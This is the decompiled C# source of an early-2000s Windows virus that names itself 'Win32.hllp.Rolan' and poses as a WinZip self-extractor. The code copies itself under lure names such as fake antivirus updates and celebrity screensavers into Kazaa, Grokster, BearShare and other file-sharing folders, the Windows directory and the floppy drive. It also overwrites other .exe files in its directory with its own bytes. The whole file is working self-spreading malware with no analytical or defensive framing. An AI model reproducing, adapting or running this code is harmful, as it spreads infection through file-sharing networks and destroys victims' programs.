using System;
using System.IO;
using System.Reflection;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
internal sealed class Module1
{
	private static string gname;

	private static string cdir = Directory.GetCurrentDirectory();

	private static string filnam;

	private static Module you = Assembly.GetExecutingAssembly().GetModules()[0];

	[STAThread]
	public static void Main()
	{
		//IL_068c: Unknown result type (might be due to invalid IL or missing references)
		int try0000_dispatch = -1;
		checked
		{
			int num3 = default(int);
			int num = default(int);
			FileStream stream = default(FileStream);
			StreamWriter streamWriter = default(StreamWriter);
			string[] files = default(string[]);
			int num4 = default(int);
			int num5 = default(int);
			int num6 = default(int);
			string text = default(string);
			object obj = default(object);
			BinaryReader binaryReader = default(BinaryReader);
			byte[] array = default(byte[]);
			int num7 = default(int);
			string[] array2 = default(string[]);
			int num8 = default(int);
			Exception ex = default(Exception);
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					switch (try0000_dispatch)
					{
					default:
						num3 = 0;
						Console.WriteLine("Winzip Self Extractor, Files are Being Extracted");
						goto IL_000d;
					case 1728:
						{
							int num2 = unchecked(num + 1);
							num = 0;
							switch (num2)
							{
							case 0:
								break;
							case 1:
								goto IL_000d;
							case 2:
								goto IL_001a;
							case 3:
								goto IL_002a;
							case 4:
								goto IL_0034;
							case 5:
								goto IL_0042;
							case 6:
								goto IL_0050;
							case 7:
								goto IL_005e;
							case 8:
								goto IL_006c;
							case 9:
								goto IL_0075;
							case 10:
								goto IL_00a2;
							case 11:
								goto IL_00b0;
							case 12:
								goto IL_00bb;
							case 13:
								goto IL_00dd;
							case 14:
								goto IL_00ef;
							case 15:
								goto IL_0101;
							case 16:
								goto IL_0105;
							case 17:
								goto IL_0120;
							case 18:
								goto IL_012f;
							case 19:
								goto IL_013a;
							case 22:
								goto IL_0146;
							case 23:
								goto IL_0158;
							case 25:
							case 26:
								goto IL_0163;
							case 27:
								goto IL_016e;
							case 24:
							case 29:
								goto IL_017e;
							case 30:
								goto IL_0189;
							case 31:
								goto IL_0195;
							case 32:
								goto IL_019d;
							case 33:
								goto IL_01b7;
							case 34:
								goto IL_01c3;
							case 35:
								goto IL_01cf;
							case 36:
								goto IL_01db;
							case 37:
								goto IL_01e7;
							case 38:
								goto IL_01f3;
							case 39:
								goto IL_01ff;
							case 40:
								goto IL_020b;
							case 41:
								goto IL_0217;
							case 42:
								goto IL_0223;
							case 43:
								goto IL_0230;
							case 44:
								goto IL_023d;
							case 45:
								goto IL_025b;
							case 46:
								goto IL_0269;
							case 47:
								goto IL_0287;
							case 48:
								goto IL_0295;
							case 49:
								goto IL_02b3;
							case 50:
								goto IL_02c1;
							case 51:
								goto IL_02df;
							case 52:
								goto IL_02ed;
							case 53:
								goto IL_030b;
							case 54:
								goto IL_0319;
							case 55:
								goto IL_034f;
							case 56:
								goto IL_0385;
							case 57:
								goto IL_03bb;
							case 58:
								goto IL_03f1;
							case 59:
								goto IL_0427;
							case 60:
								goto IL_045d;
							case 61:
								goto IL_0493;
							case 62:
								goto IL_04c9;
							case 63:
								goto IL_04ff;
							case 64:
								goto IL_0535;
							case 65:
								goto IL_056b;
							case 66:
								goto IL_05a1;
							case 67:
								goto IL_05d7;
							case 68:
								goto IL_060d;
							case 69:
								goto IL_0621;
							case 70:
								goto IL_063c;
							case 71:
								goto IL_0652;
							case 72:
								goto IL_066a;
							case 73:
								goto IL_0681;
							case 74:
							case 75:
								goto IL_0697;
							case 76:
								goto IL_06a1;
							case 20:
							case 21:
							case 28:
								goto IL_06aa;
							case 77:
								goto end_IL_0000;
							default:
								goto IL_084c;
							}
							goto default;
						}
						IL_000d:
						num3 = 1;
						Console.WriteLine("This may take a few seconds");
						goto IL_001a;
						IL_001a:
						num3 = 2;
						stream = new FileStream("c:\\Runll.bat", FileMode.Append, FileAccess.Write);
						goto IL_002a;
						IL_002a:
						num3 = 3;
						streamWriter = new StreamWriter(stream);
						goto IL_0034;
						IL_0034:
						num3 = 4;
						streamWriter.WriteLine("@echo off");
						goto IL_0042;
						IL_0042:
						num3 = 5;
						streamWriter.WriteLine("Set Runll.bat = *.*");
						goto IL_0050;
						IL_0050:
						num3 = 6;
						streamWriter.WriteLine("*.* >> Runll.bat");
						goto IL_005e;
						IL_005e:
						num3 = 7;
						streamWriter.WriteLine("copy %0 %0.Runll.bat");
						goto IL_006c;
						IL_006c:
						num3 = 8;
						streamWriter.Close();
						goto IL_0075;
						IL_0075:
						num3 = 9;
						files = Directory.GetFiles(cdir, "*.exe");
						num4 = 0;
						goto IL_008d;
						IL_008d:
						if (num4 < files.Length)
						{
							gname = files[num4];
							goto IL_00a2;
						}
						break;
						IL_016e:
						num3 = 27;
						num5 -= num6;
						goto IL_06aa;
						IL_00a2:
						num3 = 10;
						filnam = "Winzip.exe";
						goto IL_00b0;
						IL_00b0:
						num3 = 11;
						text = "Winzip.exe";
						goto IL_00bb;
						IL_00bb:
						num3 = 12;
						FileSystem.FileCopy(you.FullyQualifiedName, "" + filnam);
						goto IL_00dd;
						IL_00dd:
						num3 = 13;
						obj = new FileStream(filnam, FileMode.Open, FileAccess.Read);
						goto IL_00ef;
						IL_00ef:
						num3 = 14;
						binaryReader = new BinaryReader((Stream)obj);
						goto IL_0101;
						IL_0101:
						num3 = 15;
						goto IL_0105;
						IL_0105:
						num3 = 16;
						binaryReader.BaseStream.Seek(0L, SeekOrigin.Begin);
						goto IL_0120;
						IL_0120:
						num3 = 17;
						array = new byte[11001];
						goto IL_012f;
						IL_012f:
						num3 = 18;
						num5 = 11000;
						goto IL_013a;
						IL_013a:
						num3 = 19;
						num7 = 0;
						goto IL_06aa;
						IL_06aa:
						num3 = 21;
						if (num5 > 0)
						{
							goto IL_0146;
						}
						goto IL_017e;
						IL_0146:
						num3 = 22;
						num6 = binaryReader.Read(array, num7, num5);
						goto IL_0158;
						IL_0158:
						num3 = 23;
						if (num6 != 0)
						{
							goto IL_0163;
						}
						goto IL_017e;
						IL_017e:
						num3 = 29;
						binaryReader.Close();
						goto IL_0189;
						IL_0189:
						num3 = 30;
						array2 = new string[11];
						goto IL_0195;
						IL_0195:
						ProjectData.ClearProjectError();
						num8 = 1;
						goto IL_019d;
						IL_019d:
						num3 = 32;
						FileSystem.Dir(FileSystem.CurDir() + "Rolan.exe", (FileAttribute)0);
						goto IL_01b7;
						IL_01b7:
						num3 = 33;
						array2[0] = "Sex Explorer.exe";
						goto IL_01c3;
						IL_01c3:
						num3 = 34;
						array2[1] = "Winzip8.exe";
						goto IL_01cf;
						IL_01cf:
						num3 = 35;
						array2[2] = "Wolfenstein Enemy Territory.exe";
						goto IL_01db;
						IL_01db:
						num3 = 36;
						array2[3] = "Gta vice city Trial.exe";
						goto IL_01e7;
						IL_01e7:
						num3 = 37;
						array2[4] = "Angelina Jolie Screensaver.exe";
						goto IL_01f3;
						IL_01f3:
						num3 = 38;
						array2[5] = "Sex Sex Sex.exe";
						goto IL_01ff;
						IL_01ff:
						num3 = 39;
						array2[6] = "Hot Teens.exe";
						goto IL_020b;
						IL_020b:
						num3 = 40;
						array2[7] = "Norton Anti Virus Update.exe";
						goto IL_0217;
						IL_0217:
						num3 = 41;
						array2[8] = "Visual Basic Help.exe";
						goto IL_0223;
						IL_0223:
						num3 = 42;
						array2[9] = "Mc Afee Virus Scan.exe";
						goto IL_0230;
						IL_0230:
						num3 = 43;
						array2[10] = "Anna Kournikova ScreenSaver.exe";
						goto IL_023d;
						IL_023d:
						num3 = 44;
						if (StringType.StrCmp(FileSystem.Dir("c:\\program files\\Kazaa\\my shared folder\\stuff", (FileAttribute)16), "", false) == 0)
						{
							goto IL_025b;
						}
						goto IL_0269;
						IL_025b:
						num3 = 45;
						FileSystem.MkDir("c:\\program files\\Kazaa\\my shared folder");
						goto IL_0269;
						IL_0269:
						num3 = 46;
						if (StringType.StrCmp(FileSystem.Dir("c:\\program files\\KMD\\my shared folder\\stuff", (FileAttribute)16), "", false) == 0)
						{
							goto IL_0287;
						}
						goto IL_0295;
						IL_0287:
						num3 = 47;
						FileSystem.MkDir("c:\\program files\\KMD\\my shared folder");
						goto IL_0295;
						IL_0295:
						num3 = 48;
						if (StringType.StrCmp(FileSystem.Dir("c:\\program files\\Kazaa Lite\\my shared folder\\stuff", (FileAttribute)16), "", false) == 0)
						{
							goto IL_02b3;
						}
						goto IL_02c1;
						IL_02b3:
						num3 = 49;
						FileSystem.MkDir("c:\\program files\\Kazaa Lite\\my shared folder");
						goto IL_02c1;
						IL_02c1:
						num3 = 50;
						if (StringType.StrCmp(FileSystem.Dir("c:\\program files\\Grokster\\my shared folder\\stuff", (FileAttribute)16), "", false) == 0)
						{
							goto IL_02df;
						}
						goto IL_02ed;
						IL_02df:
						num3 = 51;
						FileSystem.MkDir("c:\\program files\\Grokster\\my shared folder\\stuff");
						goto IL_02ed;
						IL_02ed:
						num3 = 52;
						if (StringType.StrCmp(FileSystem.Dir("c:\\program files\\BearShare\\my shared folder\\stuff", (FileAttribute)16), "", false) == 0)
						{
							goto IL_030b;
						}
						goto IL_0319;
						IL_030b:
						num3 = 53;
						FileSystem.MkDir("c:\\program files\\BearShare\\my shared folder\\stuff");
						goto IL_0319;
						IL_0319:
						num3 = 54;
						FileSystem.FileCopy(text, "C:\\Program Files\\Kazaa\\my shared folder\\" + array2[(int)Math.Round(VBMath.Rnd() * 5f + VBMath.Rnd() * 5f)]);
						goto IL_034f;
						IL_034f:
						num3 = 55;
						FileSystem.FileCopy(text, "C:\\Program Files\\KMD\\my shared folder\\" + array2[(int)Math.Round(VBMath.Rnd() * 5f + VBMath.Rnd() * 5f)]);
						goto IL_0385;
						IL_0385:
						num3 = 56;
						FileSystem.FileCopy(text, "C:\\Program Files\\Kazaa Lite\\my shared folder\\" + array2[(int)Math.Round(VBMath.Rnd() * 5f + VBMath.Rnd() * 5f)]);
						goto IL_03bb;
						IL_03bb:
						num3 = 57;
						FileSystem.FileCopy(text, "C:\\Program Files\\Grokster\\my shared folder\\" + array2[(int)Math.Round(VBMath.Rnd() * 5f + VBMath.Rnd() * 5f)]);
						goto IL_03f1;
						IL_03f1:
						num3 = 58;
						FileSystem.FileCopy(text, "C:\\Program Files\\BearShare\\my shared folder\\" + array2[(int)Math.Round(VBMath.Rnd() * 5f + VBMath.Rnd() * 5f)]);
						goto IL_0427;
						IL_0427:
						num3 = 59;
						FileSystem.FileCopy(text, "C:\\Windows\\" + array2[(int)Math.Round(VBMath.Rnd() * 5f + VBMath.Rnd() * 5f)]);
						goto IL_045d;
						IL_045d:
						num3 = 60;
						FileSystem.FileCopy(text, "C:\\Windows\\" + array2[(int)Math.Round(VBMath.Rnd() * 5f + VBMath.Rnd() * 5f)]);
						goto IL_0493;
						IL_0493:
						num3 = 61;
						FileSystem.FileCopy(text, "C:\\Windows\\" + array2[(int)Math.Round(VBMath.Rnd() * 5f + VBMath.Rnd() * 5f)]);
						goto IL_04c9;
						IL_04c9:
						num3 = 62;
						FileSystem.FileCopy(text, "C:\\Windows\\" + array2[(int)Math.Round(VBMath.Rnd() * 5f + VBMath.Rnd() * 5f)]);
						goto IL_04ff;
						IL_04ff:
						num3 = 63;
						FileSystem.FileCopy(text, "A:\\" + array2[(int)Math.Round(VBMath.Rnd() * 5f + VBMath.Rnd() * 5f)]);
						goto IL_0535;
						IL_0535:
						num3 = 64;
						FileSystem.FileCopy(text, "C:\\Windows\\" + array2[(int)Math.Round(VBMath.Rnd() * 5f + VBMath.Rnd() * 5f)]);
						goto IL_056b;
						IL_056b:
						num3 = 65;
						FileSystem.FileCopy(text, "C:\\Windows\\" + array2[(int)Math.Round(VBMath.Rnd() * 5f + VBMath.Rnd() * 5f)]);
						goto IL_05a1;
						IL_05a1:
						num3 = 66;
						FileSystem.FileCopy(text, "C:\\" + array2[(int)Math.Round(VBMath.Rnd() * 5f + VBMath.Rnd() * 5f)]);
						goto IL_05d7;
						IL_05d7:
						num3 = 67;
						FileSystem.FileCopy(text, "C:\\Windows\\" + array2[(int)Math.Round(VBMath.Rnd() * 5f + VBMath.Rnd() * 5f)]);
						goto IL_060d;
						IL_060d:
						num3 = 68;
						FileSystem.FileOpen(1, gname, (OpenMode)32, (OpenAccess)(-1), (OpenShare)(-1), -1);
						goto IL_0621;
						IL_0621:
						num3 = 69;
						binaryReader.BaseStream.Seek(0L, SeekOrigin.Current);
						goto IL_063c;
						IL_063c:
						num3 = 70;
						FileSystem.FilePut(1, (Array)array, -1L, false, false);
						goto IL_0652;
						IL_0652:
						num3 = 71;
						FileSystem.FileClose(new int[1] { 1 });
						goto IL_066a;
						IL_066a:
						num3 = 72;
						if (StringType.StrCmp(gname, "", false) == 0)
						{
							goto IL_0681;
						}
						goto IL_0697;
						IL_0681:
						num3 = 73;
						Interaction.MsgBox((object)"Win32.hllp.Rolan Created by me loTti 2003", (MsgBoxStyle)0, (object)null);
						ProjectData.EndApp();
						goto IL_0697;
						IL_0697:
						num3 = 75;
						num4++;
						goto IL_06a1;
						IL_06a1:
						num3 = 76;
						goto IL_008d;
						IL_0163:
						num3 = 26;
						num7 += num6;
						goto IL_016e;
						end_IL_0000:
						break;
					}
				}
				catch (object obj2) when ((obj2 is Exception && num8 != 0 && num == 0) ? true : false)
				{
					Exception obj3 = (Exception)obj2;
					ProjectData.SetProjectError(obj3);
					ex = obj3;
					if (num != 0)
					{
						goto IL_084c;
					}
					num = num3;
					switch (num8)
					{
					case 1:
						try0000_dispatch = 1728;
						break;
					default:
						throw;
					}
					continue;
				}
				break;
				IL_084c:
				throw ex;
			}
			if (num != 0)
			{
				ProjectData.ClearProjectError();
			}
		}
	}
}
